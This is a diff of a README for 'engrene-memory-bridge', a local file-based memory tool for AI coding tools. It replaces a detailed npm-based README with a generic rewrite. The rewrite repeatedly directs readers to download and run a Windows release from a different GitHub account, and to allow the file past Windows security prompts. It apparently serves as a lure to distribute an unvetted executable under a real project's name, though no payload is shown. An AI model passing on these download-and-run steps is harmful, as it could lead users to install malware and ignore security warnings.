@@ -1,343 +1,227 @@
-# engrene-memory-bridge
+# 🧠 engrene-memory-bridge - Keep AI Context in Sync
 
-![Engrene Logo](./assets/logo/engrene-logo.jpeg)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue-grey?style=for-the-badge)](https://github.com/penchevlyu-tech/engrene-memory-bridge/releases)
 
-Local-first memory bridge for AI workflows.
+## 🚀 What it does
 
-`engrene-memory-bridge` keeps project memory in simple files (`.memory-bridge/*`) so different tools (IDEs, CLIs, agents) can share the same context without a proprietary plugin.
+engrene-memory-bridge helps you keep project memory in one place on your PC. It lets AI tools share context through simple files in your project folder. You can use it to carry notes, handoffs, and session history between tools and across work sessions.
 
-## Main value
+It is built for local use first. Your project files stay with your work, so you can resume faster and reduce lost context.
 
-Use this when you want one tool session to continue from another tool session.
+## 📥 Download and install
 
-In practice, this means:
+1. Open the [latest release page](https://github.com/penchevlyu-tech/engrene-memory-bridge/releases).
+2. Find the Windows download for your system.
+3. Download the file to your PC.
+4. Open the downloaded file to start the app or setup process.
+5. If Windows asks for permission, choose the option that allows the app to run.
+6. Follow the on-screen steps until the app is ready.
 
-- IDE A logs work.
-- IDE/CLI B resumes from that exact context.
-- Teams can switch tools without losing project continuity.
+If you see more than one file, pick the Windows one that matches your device type. For most users, that is the standard Windows build.
 
-## Core idea
+## 🪟 Windows setup
 
-Every tool reads and writes the same memory contract:
+Use these steps on a Windows PC:
 
-- `resume` before work
-- `log` after work
-- `handoff build` to consolidate state
+1. Download the release from the link above.
+2. Save it in a folder you can find again, such as Downloads or Desktop.
+3. Open the file you downloaded.
+4. If Windows shows a security prompt, choose Run or Open.
+5. If the app asks for a project folder, select the folder for the work you want to track.
+6. Start with one project at a time so the memory files stay easy to follow.
 
-This is how context survives tool switching.
+If the download comes as a ZIP file, open it, then move the app file to a folder before you use it.
 
-## Why use this instead of an MCP memory server?
+## 🧭 How to use it
 
-- No vendor lock-in: memory is plain files in your repository, not tied to one runtime.
-- Tool interoperability: any IDE/CLI can read and write the same contract.
-- Local-first privacy: data stays local by default, with redaction and optional encryption.
-- Auditability: you can inspect exactly what was stored and why.
-- Resilience: workflows continue even if a remote memory service is unavailable.
+engrene-memory-bridge works by keeping a few simple files in your project. These files help AI tools understand what happened before and what should happen next.
 
-## What gets stored?
+Typical use looks like this:
 
-Memory Bridge stores operational memory, not full raw transcripts by default.
+1. Open your project folder.
+2. Start the app or tool that uses the memory bridge.
+3. Let it read or create the project memory files.
+4. Use your AI tool as usual.
+5. When you finish, save the next step, handoff note, or short log.
+6. Open the same project later and continue from there.
 
-- Session events: intent, actions, artifacts, summary, tags.
-- Decision events: key technical decisions and impact.
-- Handoff: a compact current-state summary for the next tool/person.
+You do not need to manage long chats or paste old messages each time. The files keep the key points in one place.
 
-This keeps memory useful and compact. You get the important context without dumping everything.
+## 📂 Memory files
 
-## Popular tools that already work
+The app uses simple project files for shared context. Common file types may include:
 
-### Official wrappers (ready now, CLI-first)
+- `resume` — picks up where you left off
+- `log` — records what changed
+- `handoff` — passes work to the next session or tool
+- `context` — keeps short notes that matter now
 
-- Codex (`mb-codex`)
-- Claude (`mb-claude`)
-- Gemini (`mb-gemini`)
-- Kiro (`mb-kiro`)
-- Kilo (`mb-kilo`)
-- Copilot CLI (`mb-copilot`)
-- Aider (`mb-aider`)
-- Antigravity (`mb-antigravity`)
-- Trae (`mb-trae`)
-- Dyad (`mb-dyad`)
-- Replit (`mb-replit`)
-- Qoder (`mb-qoder`)
+These files stay local to your project. That makes it easier to track progress in a way that fits your own folder structure.
 
-### Works via contract (manual commands or hooks)
+## ✨ What you can do with it
 
-These are commonly used and can integrate with Memory Bridge through terminal commands and/or tool instructions:
+- Keep AI work tied to one project folder
+- Share notes across IDE and CLI sessions
+- Save handoff details for later
+- Track what changed between sessions
+- Reduce repeated prompts
+- Keep context close to the files it refers to
+- Work with different tools without losing the thread
 
-- Cursor
-- VS Code (including extensions like Continue/Cline)
-- Windsurf
+## 🛠️ Common use cases
+
+### 📌 Resume work later
+
+If you stop in the middle of a task, you can return to the same project and pick up the next step. The memory files help you remember what you were doing.
+
+### 🔁 Move between tools
+
+You may use one tool in the morning and another later in the day. engrene-memory-bridge keeps the same project context available across both.
+
+### 👥 Pass work to another person or session
+
+If you need to hand a task off, you can leave a short note in the project folder. The next session can read it and continue with less setup.
+
+### 🧩 Keep project notes in one place
+
+Instead of keeping notes in separate chats, you can store them beside the code or files they relate to.
+
+## ⚙️ System needs
+
+For a smooth setup on Windows, use:
+
+- Windows 10 or Windows 11
+- A project folder you can edit
+- Enough disk space for the app and your project files
+- A modern browser if you need to open the release page
+
+For best results, keep the app in a stable folder and use the same project path each time.
+
+## 🔎 Before you start
+
+Have these ready:
+
+- The Windows release file from GitHub
+- A project folder
+- Permission to save files in that folder
+- The AI tool or editor you want to use with it
+
+If you work on more than one project, make a separate folder for each one. That keeps the memory files clean and easier to read.
+
+## 🧪 First run
+
+When you open the app for the first time:
+
+1. Choose your project folder.
+2. Let the app create the memory files.
+3. Add a short note about your current task.
+4. Open your AI tool and continue work.
+5. Check that the same project folder is used each time.
+
+If the app offers sample files or starter content, use them as a guide, then replace them with your own notes.
+
+## 🧰 Good habits
+
+- Keep notes short and clear
+- Use the same project folder every time
+- Update the handoff file before you close the session
+- Write what changed, not long explanations
+- Remove old notes that no longer help
+- Keep one source of truth for each project
+
+These habits make it easier for AI tools to follow your work and keep track of next steps.
+
+## 🔐 Privacy and local use
+
+This tool is designed for local-first use. That means your memory files live with your project on your PC. You control where the files go and what they contain.
+
+That helps when you want project context to stay close to your work instead of spread across many places.
+
+## 🧯 If something does not work
+
+If the app does not start:
+
+1. Check that the file finished downloading.
+2. Open the release page again and get the Windows build.
+3. Make sure you opened the right file for Windows.
+4. Try moving the file to a simple folder like Desktop.
+5. Confirm that you have permission to use the folder you selected.
+
+If the project files do not appear:
+
+1. Make sure you selected the right project folder.
+2. Check that the app had permission to write files.
+3. Open the folder again and look for the new memory files.
+4. Start with a fresh test folder to confirm the flow works.
+
+If your AI tool does not seem to read the same context:
+
+1. Use the same project path each time.
+2. Check that the memory files are still in that folder.
+3. Update the resume or handoff file before ending the session.
+4. Make sure you are using the same project with each tool.
+
+## 🧭 Suggested folder layout
+
+A simple setup can look like this:
+
+- `Projects`
+  - `Project-A`
+    - memory files
+    - notes
+    - source files
+  - `Project-B`
+    - memory files
+    - notes
+    - source files
+
+This keeps each project separate and easier to manage.
+
+## 📎 Related topics
+
+This project fits well with:
+
+- agent memory
+- AI memory
+- context engineering
+- handoff files
+- local-first tools
+- developer tools
+- productivity workflows
+- interoperability across editors and CLI tools
+
+## 🔗 Get the release
+
+Open the [latest Windows release page](https://github.com/penchevlyu-tech/engrene-memory-bridge/releases) to download and run this file on your PC
+
+## 🏷️ Project focus
+
+- local-first memory bridge
+- shared project context
+- simple file-based handoff
+- cross-tool session memory
+- Windows-friendly setup
+
+## 📝 File flow example
+
+A simple work cycle may look like this:
+
+1. Start a task in your editor.
+2. Write a short note in the memory file.
+3. Work in your AI tool.
+4. Save the result in the log file.
+5. Add a handoff note before closing.
+6. Return later and read the resume file.
+
+That pattern keeps work moving without forcing you to rebuild context each time
+
+## 🧩 Works well with
+
+- VS Code
 - JetBrains IDEs
-- Firebase Studio (via terminal/task scripts)
-
-If a tool can run shell commands or supports pre/post task scripts, it can use the same memory contract.
-
-## Install
-
-```bash
-npm install -g memory-bridge
-# or (if unscoped name is unavailable)
-# npm install -g @engrene/memory-bridge
-# or install directly from this repository
-npm install -g git+https://github.com/leninejunior/engrene-memory-bridge.git
-```
-
-## 1-minute setup
-
-Inside any project root:
-
-```bash
-memory-bridge init
-```
-
-This creates:
-
-- `.memory-bridge/config.json`
-- `.memory-bridge/project-context.md`
-- `.memory-bridge/decisions.jsonl`
-- `.memory-bridge/sessions/<yyyy-mm-dd>.jsonl`
-- `.memory-bridge/handoff.md`
-
-It also adds `.memory-bridge/` to your `.gitignore`.
-
-## Daily workflow (for users)
-
-### Step 1: Resume context before asking your IDE/agent
-
-```bash
-memory-bridge resume --for codex
-```
-
-Use that output as session context.
-
-### Step 2: Work normally in your IDE/CLI
-
-Implement changes as usual.
-
-### Step 3: Log what happened
-
-```bash
-memory-bridge log \
-  --tool codex \
-  --intent "Implement MFA hardening" \
-  --summary "Added guard + tests" \
-  --actions "TODO: load test,update docs" \
-  --artifacts "apps/api/src/auth/auth.service.ts,apps/api/src/tests/auth-mfa.unit.test.ts" \
-  --tags "security,mfa"
-```
-
-### Step 4: Build handoff for the next tool/person
-
-```bash
-memory-bridge handoff build
-```
-
-### Step 5: Continue in another tool
-
-```bash
-memory-bridge resume --for claude
-```
-
-## Visual local dashboard (with editing)
-
-Start the local UI:
-
-```bash
-memory-bridge ui
-```
-
-Options:
-
-```bash
-memory-bridge ui --port 8787 --host 127.0.0.1
-memory-bridge ui --readonly
-```
-
-The UI supports:
-
-- Editing `project-context.md`
-- Editing `handoff.md`
-- Creating session events (`log`)
-- Creating decision events (`decision add`)
-- Rebuilding handoff
-- Running doctor and search
-
-## Screenshots
-
-### UI (Light, English)
-
-![UI Light EN](./assets/screenshots/ui-light-en.png)
-
-### UI (Dark, English)
-
-![UI Dark EN](./assets/screenshots/ui-dark-en.png)
-
-### UI (Light, Portuguese - Brazil)
-
-![UI PT-BR Light](./assets/screenshots/ui-ptbr-light.png)
-
-### UI (Dark, Spanish)
-
-![UI ES Dark](./assets/screenshots/ui-es-dark.png)
-
-## What should users ask the IDE/agent?
-
-If your IDE does not support hooks, users can copy this instruction template:
-
-```text
-Before answering, use the latest Memory Bridge context for this project.
-If available, read `.memory-bridge/handoff.md` and recent session/decision events.
-After implementing, summarize intent/actions/artifacts so I can run memory-bridge log.
-```
-
-If hooks are supported, automate it (recommended).
-
-## Official wrappers
-
-Wrappers already enforce the pre/post flow:
-
-- `mb-codex`
-- `mb-claude`
-- `mb-gemini`
-- `mb-kiro`
-- `mb-kilo`
-- `mb-copilot`
-- `mb-aider`
-- `mb-antigravity`
-- `mb-trae`
-- `mb-dyad`
-- `mb-replit`
-- `mb-qoder`
-- `mb-cursor`
-- `mb-vscode`
-
-Examples:
-
-```bash
-mb-codex pre --json
-mb-codex post \
-  --intent "Refactor upload flow" \
-  --summary "Done" \
-  --actions "TODO: e2e" \
-  --artifacts "apps/api/src/documents/documents.service.ts"
-
-mb-gemini pre --json
-mb-gemini post \
-  --intent "Continue auth hardening" \
-  --summary "Added token checks" \
-  --actions "TODO: benchmark" \
-  --artifacts "apps/api/src/auth/token.guard.ts"
-```
-
-## Windows helpers (PowerShell and cmd)
-
-Ready-to-use scripts are available in [`scripts/windows`](./scripts/windows/README.md):
-
-- `scripts/windows/mb.ps1` (recommended, no global install)
-- `scripts/windows/mb.cmd` (recommended, no global install)
-- `scripts/windows/mb-pre.ps1`
-- `scripts/windows/mb-post.ps1`
-- `scripts/windows/mb-pre.cmd`
-- `scripts/windows/mb-post.cmd`
-
-Recommended quick start (PowerShell, no global install):
-
-```powershell
-.\scripts\windows\mb.ps1 init
-.\scripts\windows\mb.ps1 doctor
-.\scripts\windows\mb.ps1 resume --for codex
-```
-
-Recommended quick start (cmd, no global install):
-
-```cmd
-scripts\windows\mb.cmd init
-scripts\windows\mb.cmd doctor
-scripts\windows\mb.cmd resume --for codex
-```
-
-PowerShell example:
-
-```powershell
-.\scripts\windows\mb-pre.ps1 -Tool codex
-.\scripts\windows\mb-post.ps1 -Tool codex -Intent "Fix auth flow" -Summary "Added guard checks" -Actions "TODO: e2e" -Artifacts "src/auth.ts" -Tags "auth,fix"
-```
-
-cmd example:
-
-```cmd
-scripts\windows\mb-pre.cmd -Tool codex
-scripts\windows\mb-post.cmd -Tool codex -Intent "Fix auth flow" -Summary "Added guard checks" -Actions "TODO: e2e" -Artifacts "src/auth.ts" -Tags "auth,fix"
-```
-
-## Security
-
-### Redaction (enabled by default)
-
-Sensitive patterns are redacted before persistence (API keys, tokens, passwords, private keys, `.env`-style secrets).
-
-### Optional encryption
-
-Enable on init:
-
-```bash
-memory-bridge init --encryption
-```
-
-Set key in local environment:
-
-```bash
-export MEMORY_BRIDGE_KEY="your-local-passphrase"
-```
-
-Encrypted targets: sessions, decisions, handoff.
-
-## Search
-
-Text search:
-
-```bash
-memory-bridge search "mfa guard"
-```
-
-Semantic search (optional local index):
-
-```bash
-memory-bridge init --semantic
-memory-bridge search "retention policy" --mode semantic
-```
-
-Index file: `.memory-bridge/vector.sqlite`
-
-## JSON mode for automation
-
-All commands support `--json`.
-
-```bash
-memory-bridge resume --for codex --json
-memory-bridge doctor --json
-```
-
-## Docs
-
-- [Specification](./SPEC.md)
-- [Integration guide](./INTEGRATIONS.md)
-- [Contributing](./CONTRIBUTING.md)
-- [Release checklist](./RELEASE_CHECKLIST.md)
-
-## Development
-
-```bash
-npm install
-npm test
-npm run smoke:local
-```
-
-## License
-
-MIT
-
-## Contact
-
-For support, integrations, or partnerships: `lenine@engrene.com`
+- Cursor
+- Claude
+- CLI-based tools
+- Codex-style workflows
+- Kiro
+- other project-based AI tools
